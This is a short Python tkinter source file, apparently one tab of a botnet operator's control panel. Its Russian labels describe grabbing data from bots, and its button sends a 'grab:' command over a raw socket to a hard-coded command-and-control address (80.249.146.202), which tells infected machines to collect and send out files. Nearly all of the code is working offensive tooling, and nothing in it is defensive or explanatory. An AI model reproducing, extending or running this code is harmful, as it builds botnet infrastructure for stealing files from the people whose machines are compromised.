import tkinter as tk
from tkinter import ttk, messagebox
import threading, socket, json

class ExfilTab:
    def __init__(self, notebook, app):
        self.app = app
        self.frame = ttk.Frame(notebook)
        self._create_widgets()

    def _create_widgets(self):
        main = ttk.Frame(self.frame, padding=10)
        main.pack(fill=tk.BOTH, expand=True)

        ttk.Label(main, text="Захват данных с ботов", font=("Arial", 12, "bold")).pack(anchor='w')

        ttk.Label(main, text="Команда будет отправлена на C2, боты выполнят сбор файлов.").pack()
        ttk.Button(main, text="Запустить граб (на всех ботах)", command=self.start_grab).pack(pady=10)

        self.log = tk.Text(main, height=8, bg='white')
        self.log.pack(fill=tk.BOTH, expand=True)

    def start_grab(self):
        def send():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect(("80.249.146.202", 80))
                s.sendall(b"grab:")
                resp = s.recv(1024)
                s.close()
                self.log.insert(tk.END, f"[+] Ответ C2: {resp.decode()}\n")
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
        threading.Thread(target=send, daemon=True).start()
        self.log.insert(tk.END, "[*] Команда граб отправлена\n")
